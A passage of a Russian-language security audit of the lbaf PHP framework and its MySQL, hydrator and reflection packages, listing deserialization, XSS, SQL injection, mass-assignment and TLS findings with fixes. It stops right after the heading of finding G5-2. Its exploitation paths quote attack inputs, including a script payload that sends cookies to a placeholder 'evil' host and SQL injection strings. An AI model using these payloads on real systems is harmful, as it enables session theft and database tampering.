# Security Review — lbaf framework + entelisteam/* пакеты

## Резюме

Общее состояние безопасности фреймворка вызывает серьёзную озабоченность: подтверждены несколько критичных по влиянию классов уязвимостей. Самые важные риски — это (1) полное раскрытие внутренней информации и raw-данных запроса в ответах об ошибках на web- и API-контроллерах (без production/debug-гейта, с reflected XSS на web-пути), (2) множественные SQL-инъекции в `lbaf-mysql` через неэкранируемый строковый `WHERE`, инъекцию идентификаторов (real_escape_string не экранирует backtick) и полностью неэкранированный список полей в `ON DUPLICATE KEY UPDATE`, (3) небезопасная десериализация request-данных через `msgpack_unpack()` в packer-пути Inject*, (4) глубокий mass-assignment произвольных классов из request-данных в hydrator, и (5) отключённая по умолчанию проверка TLS-сертификатов в Curl-хелпере. Дополнительно секреты (Authorization, cookies, пароли) логируются в открытом виде на каждый запрос. Корневые причины — отсутствие разделения «client-safe vs internal» в модели ошибок, отсутствие явного DTO/allow-list-контракта при hydration, и опора на `real_escape_string` как на единственный примитив экранирования (непригодный для идентификаторов).

## Сводка по находкам (confirmed)

| Status | ID | Severity | Класс | Файл | Краткое описание |
|--------|----|----------|-------|------|------------------|
| Fixed  | F1 | high | Deserialization/ObjectInjection | src/Lbaf/Packer/MsgPack.php:26-29 | `msgpack_unpack()` на attacker-controlled GET/POST в packer-пути Inject* |
| Fixed  | G7-1 | high | Deserialization | src/Lbaf/Container/Attribute/InjectValueArrayAbstract.php:28-37 | Source→sink: raw request value → `$packer->unpack()` → `msgpack_unpack()` при PackerType::MsgPack |
|        | F2 | high | XSS | src/Lbaf/Controller/AbstractWebController.php:23-31 | Raw exception message + путь + полный stack trace в HTML без экранирования и debug-гейта (reflected XSS) |
|        | F3 | high | InfoDisclosure | src/Lbaf/Controller/AbstractApiController.php:20-36 | API error-ответ отражает весь `$_GET/$_POST/$_FILES` + raw message клиенту |
|        | F4 | high | SQLi | entelisteam/lbaf-mysql/src/MySql.php:605-647 | Строковый `$where` в `update()`/`updateIgnore()` конкатенируется без экранирования |
|        | F5 | high | SQLi | entelisteam/lbaf-mysql/src/MySql.php (identifier positions) | Инъекция идентификаторов: `sqlEscape()`/`real_escape_string` не экранирует backtick |
|        | F6 | high | SQLi | entelisteam/lbaf-mysql/src/MySql.php:437-441 | Список полей `ON DUPLICATE KEY UPDATE` интерполируется вообще без экранирования |
|        | G11-1 | high | SQLi | entelisteam/lbaf-mysql/src/MySql.php:438-439 | Тот же ODKU-сток через `insertUpdateExcept()`, имена колонок из ключей данных (mass-assignment) |
|        | G1-1 | high | MassAssignment | entelisteam/lbaf-hydrator/src/Internal/HydratorEngine.php:39-62, 463-464 | Class-typed Inject-параметр: атакующий заполняет всю public-поверхность класса |
|        | F8 | high | Crypto/MITM | src/Lbaf/Helper/Curl.php:75-86 | `CURLOPT_SSL_VERIFYPEER => false` по умолчанию, `VERIFYHOST` не задан |
|        | G9-1 | high | InfoDisclosure | src/Lbaf/ControllerProxy.php:90-103 | На каждый успешный запрос логируются все hydrated-аргументы (токены/cookies/пароли) + ответ |
|        | F9 | medium | TypeConfusion/MassAssignment | entelisteam/php-reflection-helpers/src/TypeCaster.php:12-22 | Массив тихо приводится к `1`/`"Array"` вместо отклонения для скалярных типов |
|        | F14 | medium | InfoDisclosure | entelisteam/lbaf-mysql/src/Exception/MySqlQueryException.php:13-21 | Сообщение исключения содержит полный SQL и raw MySQL error |
|        | F15 | medium | XSS | entelisteam/lbaf-mysql/src/MySql.php:384-395 | `printLog()` выводит raw SQL в HTML без экранирования (debug-only) |
|        | G1-2 | medium | DoS | entelisteam/lbaf-hydrator/src/Internal/HydratorEngine.php:347-392 | Неограниченное создание объектов при array-hydration (packer обходит max_input_vars) |
|        | G4-1 | medium | AccessControl | src/Lbaf/Router/CliRouter.php:40-58 | CLI action берётся из argv без allowlist — вызывается любой public-метод контроллера |
|        | G5-2 | medium | AccessControl/DataIntegrity | src/Lbaf/Database/Rabbit.php:624,401-409,446 | RPC reply-очередь не exclusive + 15-мин x-expires — возможна подмена ответа |
|        | G9-2 | medium | InfoDisclosure | src/Lbaf/ControllerProxy.php:130-139 | Hydrated-аргументы (секреты) уходят в error-context лога без редакции |
|        | F21 | low | MassAssignment | entelisteam/lbaf-hydrator/src/Internal/HydratorEngine.php:232-244,51-59 | Hydrator mass-assign'ит все public-свойства без opt-out |
|        | F23 | low | Crypto/TransportSecurity | src/Lbaf/Database/Redis.php:30-73 | Redis по умолчанию cleartext, AUTH-пароль идёт открытым текстом |
|        | F25 | low | LogInjection | src/Lbaf/Daemon/Daemon.php:112-113 | Raw AMQP-тело пишется в error_log без санитизации |
|        | F26 | low | LogInjection | src/Lbaf/Logger/LogProcessor.php:29-31 | Message+trace исключения логируются через error_log без санитизации |
|        | F27 | low | InfoDisclosure | entelisteam/lbaf-exception/src/CustomException.php:12-44 | Нет разделения client-safe/internal сообщения — корень F2/F3/F14 |
|        | F30 | low | InfoDisclosure | src/Lbaf/Response/HtmlResponse.php:17-22 | Нет `X-Content-Type-Options: nosniff` и других security-заголовков |

## Подтверждённые находки (детально)

### F1 / G7-1 — [HIGH] Deserialization / ObjectInjection: `msgpack_unpack()` на attacker-controlled request-данных

**Расположение:** sink — `src/Lbaf/Packer/MsgPack.php:26-29` (`msgpack_unpack($data)`); достигается из `src/Lbaf/Container/Attribute/InjectValueArrayAbstract.php:28-37` (`$packer = new $this->packerType->value; $this->value = $packer->unpack($this->value);`).

**Описание.** Когда Inject-атрибут (`InjectGet`/`InjectPost`/`InjectCookie`/`InjectHeader`) сконфигурирован с `PackerType::MsgPack`, `InjectValueArrayAbstract::getValue()` берёт raw-значение из суперглобала (`$this->value = $this->arr[$this->key]`, строка 28) и прогоняет через `MsgPack::unpack()`, который вызывает `msgpack_unpack()`. PECL `ext-msgpack` при дефолтном `msgpack.php_only=On` реконструирует произвольные PHP-объекты по имени класса и вызывает магические методы (`__wakeup`/`__destruct`) — это эквивалент `unserialize()` над полностью контролируемыми атакующим байтами, но без `allowed_classes`, лимита глубины и проверки целостности/HMAC. Object injection происходит на этапе `unpack()`, до какой-либо типизации hydrator'ом.

**Путь эксплуатации.** Контроллер объявляет действие `function ingest(#[InjectPost('blob', PackerType::MsgPack)] $blob)`. Неаутентифицированный атакующий шлёт POST с msgpack-блобом, кодирующим сериализованный объект gadget-класса (с опасным `__destruct`/`__wakeup`). `InjectionResolver::resolve()` → `getValue()` → `msgpack_unpack()` реконструирует объект, магический метод срабатывает во время обработки/teardown запроса → POP-цепочка (file write/delete, SSRF, RCE в зависимости от доступных gadget'ов).

**Существующая защита.** Нет в самом packer-пути: ни allow-list классов, ни лимита глубины, ни HMAC. De-facto барьеры только средовые/opt-in: (a) `ext-msgpack` не объявлен в `composer.json` ни фреймворка, ни пакетов — sink «жив» только если расширение установлено отдельно; (b) разработчик должен явно указать `PackerType::MsgPack` на request-источнике (дефолт `PackerType::Json` использует `json_decode`, который не инстанцирует произвольные объекты). `new $this->packerType->value` (G7-2) безопасен — `PackerType` это backed-enum только из developer-source.

**Рекомендация.** Запретить `PackerType::MsgPack` (и любой объект-способный packer) на request-источниках Inject* — разрешать для входящего декода только JSON. Если нужен бинарный вход — декодировать MsgPack только в plain-массивы (без реконструкции объектов) и hydrate'ить в известные DTO. Никогда не подавать request-байты в `msgpack_unpack()` без проверки целостности и явного allow-list классов.

---

### F2 — [HIGH] XSS / InfoDisclosure: raw exception message, путь и полный stack trace в web-ответе

**Расположение:** `src/Lbaf/Controller/AbstractWebController.php:23-31`. Эмиссия: `src/Lbaf/Response/HtmlResponse.php:18` (Content-Type `text/html`), вывод — `src/Lbaf/Application/AbstractApplication.php:264`.

**Описание.** `_createErrorResponse()` безусловно строит HTML-тело ошибки из `$e->getMessage()`, абсолютного `$e->getFile()`, `$e->getLine()` и полного `$e->getTraceAsString()`, обёрнутых только в `<pre>`, без environment-гейта и без HTML-экранирования:

```php
new HtmlResponse('<pre>' . $e->getMessage() . PHP_EOL . 'in ' . $e->getFile()
    . ' line ' . $e->getLine() . PHP_EOL . $e->getTraceAsString() . '</pre>')
```

Это раскрывает раскладку ФС сервера, структуру фреймворка/библиотек, имена классов и (для DB-ошибок) живой SQL любому посетителю, который может вызвать ошибку. Поскольку сообщения исключений регулярно содержат attacker-influenced строки (hydrator path/key из request-данных, app-сообщения вида `Invalid value: <input>`), а вывод — неэкранированный `text/html`, сообщение с разметкой вроде `</pre><script>...` исполняется как reflected XSS.

**Путь эксплуатации.** Атакующий вызывает исключение (malformed input, отсутствующий required Inject-параметр, DB-ошибка) на web-маршруте и получает абсолютные пути, полный trace и падающий SQL. Где сообщение содержит attacker-текст (`x=</pre><script>fetch('//evil/?c='+document.cookie)</script>`), неэкранированный `<pre>` исполняет скрипт в браузере жертвы.

**Существующая защита.** Нет: ни debug/production-гейта, ни `display_errors`-проверки, ни `htmlspecialchars`; глобального error-handler'а, который подавлял бы/санитизировал этот вывод, в `src/Lbaf/Controller` и `src/Lbaf/Application` тоже нет. CLI-аналог (`AbstractCliController::_createErrorResponse`) аналогично выводит путь и полный trace.

**Рекомендация.** Скрыть детальное message/file/line/trace за явным debug-флагом (по умолчанию off); в production отдавать generic-страницу ошибки, детали логировать на сервере. Всегда `htmlspecialchars($x, ENT_QUOTES|ENT_HTML5, 'UTF-8')` для любого динамического текста перед вставкой в HTML.

---

### F3 — [HIGH] InfoDisclosure: API error-ответ отражает весь `$_GET/$_POST/$_FILES` и raw message

**Расположение:** `src/Lbaf/Controller/AbstractApiController.php:20-36` (тело JSON c `'error_message' => $e->getMessage()`, `'info_get' => $_GET`, `'info_post' => $_POST`, `'info_files' => $_FILES` на строках 29-32).

**Описание.** `_createErrorResponse()` каждого API-контроллера безусловно сериализует raw exception message плюс все суперглобалы `$_GET`/`$_POST`/`$_FILES` в JSON-тело ошибки, без production/debug-тумблера. Сообщение исключения часто несёт внутренние детали: обёрнутый `MySqlQueryException` содержит полный исполненный SQL и MySQL-ошибку (см. F14), `MySqlConnectException` — детали подключения, hydrator/Container-исключения — внутренние имена классов/параметров. Отражение всего запроса также утекает любые чувствительные значения, отправленные клиентом (токены, креды), и позволяет атакующему точно понять, как парсятся параметры (помощь enumeration и error-based SQLi).

**Путь эксплуатации.** Атакующий шлёт вход, форсирующий исключение (неверный тип для `InjectPost`-параметра либо вход, вызывающий DB syntax error). 500-JSON возвращает `error_message` вида `SQL Query Error: #1064 ... Query: SELECT ... WHERE ...` плюс `info_post` со всеми отправленными полями.

**Существующая защита.** Нет: ни debug/production-гейта, ни `set_exception_handler`, ни подавления display-errors. `info_server` — единственное закомментированное поле. `ApiResponse` ставит `Cache-Control: no-cache`, но контент не фильтруется.

**Рекомендация.** Убрать `info_get`/`info_post`/`info_files` из production-ответов (за debug-флаг, по умолчанию off). Возвращать generic-сообщение + correlation id; полные детали логировать на сервере через `LogProcessor`. Никогда не возвращать raw message для не-client-safe исключений.

---

### F4 — [HIGH] SQLi: строковый `$where` в `update()`/`updateIgnore()` конкатенируется без экранирования

**Расположение:** `entelisteam/lbaf-mysql/src/MySql.php`, sink на строке 646 (`'WHERE ' . $where`); `updateIgnore` на 591-594; документировано на 586/600.

**Описание.** Когда `$where` — массив, его ключи/значения экранируются (строки 608-625); когда `$where` — строка, она вставляется дословно после `'WHERE '` на строке 646 и исполняется через `query()` → `mysqli::real_query()`. Docblock явно гласит `string НЕ ЭКРАНИРУЕТСЯ!`, а интеграционный тест `tests/Integration/MySqlUpdateTest.php` закрепляет это как намеренный контракт. Prepared-statement/placeholder API в классе нет вообще, поэтому естественная строковая форма с любым request-derived значением даёт write-side инъекцию.

**Путь эксплуатации.** `$id = input::get('id'); $db->update('orders', ['status'=>'paid'], "id = $id");` Атакующий шлёт `id=0 OR 1=1` (обновить все строки) или `id=(SELECT id FROM users WHERE is_admin=1)`. Полный контроль над `WHERE` нейтрализует scoping по owner_id — атакующий обновляет чужие записи.

**Существующая защита.** Для строковой формы — нет. Массивная форма `$where` (608-625), `$data` (638) и `$table` (643) проходят через `sqlEscape()`/`mysqli::real_escape_string`, но строковый путь это полностью обходит. Prepared-statement API отсутствует, так что для чего-либо сложнее равенства/IN разработчик вынужден использовать небезопасную строковую форму.

**Рекомендация.** Убрать строковую форму `$where` (принимать только экранируемую массивную), либо явно переименовать в `updateRaw` с жёстким предупреждением, и добавить настоящий prepared-statement/bound-parameter API, чтобы вся интерполяция значений была параметризована.

---

### F5 — [HIGH] SQLi: инъекция идентификаторов — `sqlEscape()`/`real_escape_string` не экранирует backtick

**Расположение:** `entelisteam/lbaf-mysql/src/MySql.php`, строки 443, 476, 494, 512-519, 542, 616, 620, 638, 643.

**Описание.** Всё обращение с идентификаторами опирается на backtick-кавычки + `real_escape_string`. `real_escape_string` предназначен для строковых/data-литералов (контекст одинарных/двойных кавычек) и **никогда не экранирует backtick (0x60)** — он экранирует `' " \ NUL \n \r Ctrl-Z`, но не `` ` ``. Любой идентификатор с backtick'ом закрывает `` `...` `` -кавычки и инжектирует произвольный SQL в позицию идентификатора. Имена колонок берутся из ключей массива вызывающего, а во флагманском convenience-API пакета (`$db->insert($table, $array)`) эти ключи под mass-assignment контролируются запросом.

**Путь эксплуатации.** `$db->insert('records', input::json())`. Атакующий шлёт JSON, ключ которого `` `col`,(SELECT password FROM users LIMIT 1)) -- ` ``; `structureDataInformation` (строка 494) выводит сломанный backtick'ом идентификатор в список колонок INSERT. Request-derived `$table` с backtick'ом инжектит в `INTO`/`FROM`.

**Существующая защита.** Нет для идентификаторов: ни allowlist-regex, ни удвоения backtick'ов, ни иной валидации. Value/литеральные позиции защищены корректно (значения в двойных кавычках, `real_escape_string` экранирует `"`/`\`) — уязвимы именно позиции идентификаторов.

**Рекомендация.** Не использовать `real_escape_string` для идентификаторов. Валидировать против строгого allowlist-regex (`^[A-Za-z0-9_]+$`) и/или экранировать удвоением backtick'ов: `'`' . str_replace('`','``',$id) . '`'`. Применить ко всем table/column-позициям; не выводить имена колонок из недоверенных ключей массива без allowlist.

---

### F6 / G11-1 — [HIGH] SQLi: список полей `ON DUPLICATE KEY UPDATE` интерполируется вообще без экранирования

**Расположение:** `entelisteam/lbaf-mysql/src/MySql.php`, sink на строках 438-439 (используется на 449); `insertUpdateExcept` (560-576) строит `$fields` из ключей `$data`.

**Описание.** В отличие от column-пути в `structureDataInformation` (где хотя бы проходит через `real_escape_string`, недостаточный для backtick'ов), ветка `$fields` в `insertUpdate()` конкатенирует каждое имя поля **без какой-либо санитизации**:

```php
$update_fields[] = '`' . $column . '` = VALUES(`' . $column . '`)';
```

`$column` — без `sqlEscape()` и без валидации, затем выводится в `'ON DUPLICATE KEY UPDATE ...'` (449) и исполняется. Поскольку `insertUpdateExcept()` строит `$fields` из `array_keys($data)`, а convenience-паттерн подаёт request-массивы напрямую (mass-assignment), request-controlled ключ колонки достигает этого стока полностью неэкранированным — самый прямой вектор инъекции идентификаторов в пакете.

**Путь эксплуатации.** `$db->insertUpdateExcept('users', input::json())`. Атакующий шлёт JSON с ключом вида `` `password`=(SELECT ...) `` или `` role` = 'admin', `id ``. `insertUpdateExcept` добавляет ключ в `$fields`, строка 439 выводит его дословно в ODKU → атакующий задаёт произвольные колонки (`role`/`is_admin`) или инжектит подзапросы во время upsert.

**Существующая защита.** Для ветки `$fields` — нет вообще (ноль экранирования). `query()` использует `real_query()` (строка 145), не поддерживающий stacked-запросы, так что классический statement-chaining заблокирован — инъекция должна уложиться в один statement (важно, но это лишь частичное ограничение, не защита позиции идентификатора).

**Рекомендация.** Валидировать/allowlist'ить имена колонок `$fields` (`^[A-Za-z0-9_]+$`) и экранировать удвоением backtick'ов, как и для прочих позиций идентификаторов. Никогда не выводить обновляемые имена колонок из недоверенных ключей массива.

---

### G1-1 — [HIGH] MassAssignment: глубокий mass-assign class-typed Inject-параметра из request-данных

**Расположение:** `entelisteam/lbaf-hydrator/src/Internal/HydratorEngine.php:39-62, 463-464`.

**Описание.** Когда параметр действия контроллера (или `__before`/`__after`, или любой container-конструируемый класс) типизирован конкретным классом и несёт Inject*-атрибут, `HydratorEngine::hydrateValue` (строка 463) берёт attacker-supplied массив/объект дословно, кастует в `(object)` и вызывает `createClassFromData`. `createClassFromDefinition` затем (a) строит ВСЕ аргументы конструктора из attacker-данных (`fillArgs`+`newInstanceArgs`, 44-48) и (b) пишет КАЖДОЕ public non-static свойство из тех же данных (51-59). Allow-list / opt-in отсутствует — fillable-набор это вся public-поверхность developer-pinned класса.

**Путь эксплуатации.** Разработчик пишет `function save(#[InjectPost] Order $order)`, где `Order` имеет `public bool $isPaid` и `public int $ownerId`. Атакующий шлёт `order[ownerId]=1&order[isPaid]=true&order[total]=0`; `newInstanceArgs`/property-writes заполняют их прямо из запроса → tampering прав/владения и обход бизнес-логики без какого-либо allow-list'инга полей. (Подтверждено end-to-end на каноническом источнике: `Order2` с `int $ownerId`, `bool $isPaid`, `bool $isAdmin` полностью заполнился из подготовленного `$_POST`-массива.)

**Уточнение по readonly.** Подвектор «бесшумная перезапись инициализированных `readonly`-свойств через `ReflectionProperty::setValue`» **опровергнут**: на PHP 8.3 `setValue()` на readonly-свойстве, уже инициализированном в конструкторе, бросает `Error: Cannot modify readonly property` (ловится `ControllerProxy` и превращается в error-ответ — то есть hydration прерывается, а не тихо перезаписывает). `setValue` проходит только для readonly-свойств, которые конструктор оставил неинициализированными (легитимный путь hydration readonly-DTO). Поэтому опасность — именно в mass-assign **mutable public** свойств и конструктор-аргументов, не в обходе readonly.

**Существующая защита.** Для ядра проблемы — нет: ни allow-list, ни DTO-маркера, ни gating-атрибута (есть только `Map` для переименования и `ArrayTypeOf` для типизации элементов). Mass-assign всей public-поверхности — задокументированное намеренное поведение. Единственный инцидентный барьер — runtime-гарантия readonly PHP (см. выше).

**Рекомендация.** Не автозаполнять всю public-поверхность произвольного класса из request-данных. Требовать явный opt-in (заполнять только члены с hydration-атрибутом) и/или разрешать class-typed Inject-параметры только для классов, явно помеченных как request-DTO. Документировать, что все public-свойства client-writable (см. также F21).

---

### F8 — [HIGH] Crypto/MITM: Curl-хелпер отключает проверку TLS-сертификата по умолчанию

**Расположение:** `src/Lbaf/Helper/Curl.php:75-86` (`CURLOPT_SSL_VERIFYPEER => false` на строке 80).

**Описание.** `Curl::query()` ставит `CURLOPT_SSL_VERIFYPEER => false` глобальным дефолтом для ВСЕХ запросов и никогда не задаёт `CURLOPT_SSL_VERIFYHOST`, отключая валидацию цепочки сертификатов и hostname для каждого исходящего HTTPS-вызова через хелпер и через `AbstractService`. On-path атакующий может предъявить любой сертификат и прозрачно MITM'ить запросы к внутренним/внешним сервисам, перехватывая креды/токены из Authorization/cookie-заголовков и подменяя ответы, которые затем `json_decode`'ятся и трактуются как доверенные.

**Путь эксплуатации.** Приложение использует `Curl::post()` для обмена OAuth-кода или отправки API-ключа на HTTPS-эндпоинт. Атакующий на сетевом пути (rogue Wi-Fi, DNS/ARP/BGP-spoofing) предъявляет self-signed cert; так как `VERIFYPEER` = false, запрос проходит, утекает кред, возможна подмена ответа.

**Существующая защита.** По умолчанию — нет. `array_replace_recursive($defaultCurlOptions, $curlOptions)` (строка 83) позволяет caller'у переопределить дефолт, но безопасное значение надо подать явно; ничто во фреймворке/`AbstractService` его не восстанавливает (`AbstractService::$curlOptions` дефолтит `[]`, строка 21). Grep по `src/` и пакетам не нашёл ни одного caller'а, восстанавливающего проверку.

**Рекомендация.** Дефолтить `CURLOPT_SSL_VERIFYPEER => true` и `CURLOPT_SSL_VERIFYHOST => 2`. Разрешать отключение только явным per-call opt-in, в идеале ограниченным non-production.

---

### G9-1 — [HIGH] InfoDisclosure: полный набор hydrated-аргументов (включая креды из InjectCookie/InjectHeader/InjectPost) логируется в открытом виде на каждый успешный запрос

**Расположение:** `src/Lbaf/ControllerProxy.php:90-103`.

**Описание.** На КАЖДОМ успешном действии контроллера `ControllerProxy::__call()` логирует весь resolved-набор аргументов как `'arguments' => $item->arguments` плюс полный `'response' => $response` на уровне INFO в PSR-логгер приложения. Массив аргументов — это ровно hydrated Inject*-значения, регулярно содержащие секреты: Authorization-заголовок (`InjectHeader('authorization')` — явный пример в `InjectHeader.php:13`), session-cookies (`InjectCookie('PHPSESSID')` — пример в `InjectCookie.php:21`), POST-пароли. Редакции/маскирования/allow-list'а нет нигде во фреймворке и пакетах (grep по `sanitize/redact/mask/pushProcessor` — пусто). Логгер пишет эти секреты в свой sink (файл/stdout/syslog/ELK) открытым текстом. Это рутинный поток на каждый запрос (не только error-путь), шире, чем Rabbit-body (F25) и exception-trace (F26).

**Путь эксплуатации.** `public function auth(#[InjectHeader('authorization')] string $token, #[InjectPost('password')] string $password)`. На каждый запрос логируется `['arguments' => ['token' => 'Bearer eyJ...', 'password' => 'hunter2'], 'response' => ...]` на INFO. Любой с доступом к логам (ops, log-shipping, скомпрометированный лог-сервер, SSRF/LFI, читающий лог-файл) собирает живые токены/session ID/пароли.

**Существующая защита.** Условная/частичная: вызов лога — `getApplication()->getLogger()?->log(...)`, логгер дефолтит `null` (`AbstractApplication.php:45`) и должен быть явно подключён через `setLogger()`. То есть логирование срабатывает только когда приложение сконфигурировало PSR-логгер — а это и есть нормальная production-конфигурация, так что это не реальная защита. Когда логгер есть, raw-значения пишутся дословно.

**Рекомендация.** Не логировать raw-аргументы/ответ по умолчанию. Скрыть за явным debug-флагом (off в production); при включении — редактировать значения параметров с credential-несущими Inject-атрибутами (`InjectCookie`/`InjectHeader`/`InjectPost`) либо по denylist-ключам (`password`, `token`, `authorization`, `secret`, ...). Лучше логировать только имена/типы параметров и действие, не значения. Снизить уровень с INFO и сделать логирование ответа opt-in.

---

### F9 — [MEDIUM] TypeConfusion/MassAssignment: массив тихо коэрцится в `"Array"`/`1` вместо отклонения

**Расположение:** `entelisteam/php-reflection-helpers/src/TypeCaster.php:12-22` (int/string-касты на 16-18).

**Описание.** PHP позволяет клиенту сделать любое GET/POST/COOKIE-поле массивом через bracket-нотацию (`?id[]=x`). Когда параметр типизирован `int` или `string`, intake-путь не отклоняет массив: `cast(array,'int')` возвращает `1`, `cast(array,'string')` возвращает литерал `'Array'` (с warning'ом) вместо 400. Параметр, который разработчик считает user-supplied скаляром, становится фиксированным attacker-influenced значением, обходя проверки равенства/whitelist/владения. `declare(strict_types=1)` не помогает — `cast`/`hydrateValue` принимают `mixed`, TypeError не возникает.

**Путь эксплуатации.** Действие `view(#[InjectGet] int $id)`. Атакующий шлёт `?id[]=9999` → `(int)` массива даёт `1`, приложение работает с записью `id=1` независимо от намерения. Для `string $token`, сравниваемого со значением, `?token[]=x` форсирует литерал `'Array'`, потенциально совпадающий с misconfigured default или обходящий `!empty()`-гейт.

**Существующая защита.** Нет: `is_array()`-guard'а для скалярных целей нигде в intake-пути нет. Ветка `DefinitionType::ARRAY` (`HydratorEngine.php:149-152`) бросает при не-массиве для array-цели, но симметричного отклонения «массив для скалярной цели» нет.

**Рекомендация.** В hydrate/intake-слое: если целевой тип скалярный (`int`/`string`/`float`/`bool`), а входящее значение — массив, бросать `BadRequest`/`ArgumentTypeException` вместо каста. Добавить `is_array()`-guard перед `TypeCaster::cast` для скалярных целей.

---

### F14 — [MEDIUM] InfoDisclosure: `MySqlQueryException` содержит полный SQL и raw MySQL error

**Расположение:** `entelisteam/lbaf-mysql/src/Exception/MySqlQueryException.php:13-21` (`parent::__construct(message: "SQL Query Error: #{errno}: {mySqlErrorMessage}\nQuery: {query}")`, строка 16, httpCode 500).

**Описание.** Сообщение исключения содержит полный исполненный текст запроса и дословный MySQL-диагностик. В сочетании с error-рендерерами контроллеров (F2/F3, выдающими `getMessage()` клиенту) это даёт атакующему error-based oracle: имена таблиц/колонок, структуру запроса и DB-коды, что существенно помогает blind/error-based SQLi и schema-разведке.

**Путь эксплуатации.** Атакующий зондирует эндпоинт входом, вызывающим SQL syntax/type error; 500-ответ (через `AbstractApiController`/`AbstractWebController`) возвращает `SQL Query Error: #1064 ... Query: SELECT ... WHERE x=...`.

**Существующая защита.** Нет: ни один из error-рендереров не имеет production/debug-гейта. Raw query/error также хранятся в типизированных свойствах для логирования, но это не подавляет client-facing-утечку.

**Рекомендация.** Хранить raw query/error только в server-side логах (доступны через типизированные свойства). HTTP-facing сообщение сделать generic (`Database error`). Убедиться, что error-рендерер фреймворка никогда не выдаёт `CustomException::getMessage()` клиенту для 500 (см. F2/F3/F27).

---

### F15 — [MEDIUM] XSS: `MySql::printLog()` выводит raw SQL в HTML без экранирования

**Расположение:** `entelisteam/lbaf-mysql/src/MySql.php:384-395` (sink на строке 390 — echo `$item->query` в HTML `<td>` без `htmlspecialchars`).

**Описание.** При включённом debug-логировании web-ветка `printLog()` конкатенирует каждый логированный запрос (содержащий raw user-data) прямо в HTML. Stored/reflected значение `<script>...` исполняется в браузере оператора, а raw SQL раскрывает схему/структуру. Defense-in-depth/debug-only, но это публичный метод, генерирующий неэкранированный HTML.

**Путь эксплуатации.** Debug включён на staging/prod; атакующий отправляет запись со значением `<script>...`; последующий рендер `printLog()` отражает её неэкранированной.

**Существующая защита.** Логирование запросов скрыто за `$this->debug`, который дефолтит `false` и никогда не выставляется фреймворком в `true` (`determineIfDebug()` вызывает только `enableSqlProfiling()`, но не присваивает `$this->debug = true`). Единственный путь к `debug=true` — публичный `setDebugMode(true)`, который приложение должно вызвать явно. `printLog()` также никогда не вызывается ядром/пакетом. То есть по умолчанию лог пуст и `printLog()` не достигается на web-запросе. `real_escape_string` не нейтрализует HTML (`<`, `>`, `&`).

**Рекомендация.** `htmlspecialchars()` для query (и time) перед echo в web-ветке, либо ограничить `printLog()` CLI/JSON-выводом; не включать debug на internet-facing деплоях.

---

### G1-2 — [MEDIUM] DoS: неограниченное attacker-driven создание объектов при array-hydration

**Расположение:** `entelisteam/lbaf-hydrator/src/Internal/HydratorEngine.php:347-392, 451-452`.

**Описание.** Параметр контроллера, типизированный `array` с `#[ArrayTypeOf(SomeClass::class)]` и Inject*-атрибутом, маршрутизируется через `hydrateValue` (451) в `createArrayFromData`, который инстанцирует по одному `SomeClass`-объекту на элемент attacker-массива без верхнего лимита на число элементов или глубину вложенности. Для plain `$_GET/$_POST` blast radius ограничен `max_input_vars` (default 1000), но Inject*-атрибуты принимают `PackerType` (Json/MsgPack), чей `getValue()` декодирует raw request body (`InjectValueArrayAbstract::getValue`, 28-38) — **обходя `max_input_vars`** — так что один маленький JSON/MsgPack-body, описывающий большой массив, форсирует огромное число reflective-конструкций объектов за один запрос.

**Путь эксплуатации.** Эндпоинт объявляет `#[InjectPost(packerType: PackerType::Json)] #[ArrayTypeOf(Item::class)] array $items`. Атакующий шлёт маленький JSON-body с массивом из 5 000 000 элементов. `createArrayFromData` инстанцирует миллионы `Item` через reflection, истощая CPU/память и подвешивая worker — низко-затратная amplification DoS.

**Существующая защита.** Application-level guard'а нет (ни element-count, ни depth-cap). Только PHP-платформенные ceiling'и: `post_max_size` ограничивает body, `memory_limit` прервёт hydration (убьёт один запрос/worker), `json_decode` default depth 512 ограничивает вложенность (но не плоский large-array вектор), MsgPack имеет свои лимиты вложенности.

**Рекомендация.** Ввести конфигурируемый максимум числа элементов и максимум глубины рекурсии в `createArrayFromData`/`createClassFromData`, отклоняя превышение через `BadRequestException` вместо материализации всей структуры.

---

### G4-1 — [MEDIUM] AccessControl: CLI action выбирается из argv без allowlist (вызов непреднамеренных public-методов)

**Расположение:** `src/Lbaf/Router/CliRouter.php:40-58`; sink — `ControllerProxy.php:68` (`getMethod($action)`) и `86` (`call_user_func_array`).

**Описание.** `CliRouter::dispatch()` берёт имя метода-действия дословно из второго позиционного CLI-аргумента (`$actionName = $args[1] ?? 'index'`) и сразу вызывает его. Нет allowlist'а, нет naming-convention (`#[CliAction]`), нет проверки, что метод — преднамеренная CLI-точка входа. Следствие: ЛЮБОЙ public-метод выбранного CLI-контроллера становится dispatchable-действием, включая (a) framework-методы из `AbstractCliController`/`AbstractController`/`ContainerTrait` (log, getPublicMethods, getContainer) и (b) любой public-хелпер, который разработчик не собирался экспонировать. Аргументы биндятся по имени из `--name=value`-токенов, так что атакующий контролирует и метод, и его скалярные именованные аргументы. Контрастирует с `FastRouteRouter` (83-89), где класс/действие берутся из developer-defined route-таблицы.

**Путь эксплуатации.** Приложение определяет `MaintenanceController extends AbstractCliController` с командой `index()` плюс public-хелпером `purgeAllUsers($confirm)`. Атакующий (или менее привилегированный оператор), способный повлиять на argv: `index.php Cli/Maintenance purgeAllUsers --confirm=1`. Роутер строит контроллер, проходит `is_subclass_of(AbstractCliController)`-гейт, `ControllerProxy` вызывает `purgeAllUsers` с `confirm=1`.

**Существующая защита.** Слабая/частичная: (1) `is_subclass_of(controllerClass, AbstractController)` + `requiredControllerClass=AbstractCliController` (`ControllerProxy.php:44-54`) — ограничивает КЛАСС, но не ДЕЙСТВИЕ; (2) `call_user_func_array` неявно блокирует protected/private-методы (бросает Error), так что impact ограничен PUBLIC-методами. Allowlist'а / `#[CliAction]` / declaring-class-фильтра нет. Имена методов в PHP case-insensitive.

**Рекомендация.** Требовать явный opt-in для CLI-действий: диспетчеризовать только методы с `#[CliAction]` (или по документированной naming-convention) и проверять `$methodReflection->isPublic() && getDeclaringClass()` == конкретный контроллер до диспетчеризации. Отклонять унаследованные framework-методы. Также ловить `ReflectionException` из `getMethod()`, чтобы неизвестное действие давало чистую ошибку.

---

### G5-2 — [MEDIUM] AccessControl/DataIntegrity: RPC reply-очередь объявлена не-exclusive (+ x-expires), позволяя третьим сторонам публиковать подделанные ответы

**Расположение:** `src/Lbaf/Database/Rabbit.php:624, 401-409, 446`.

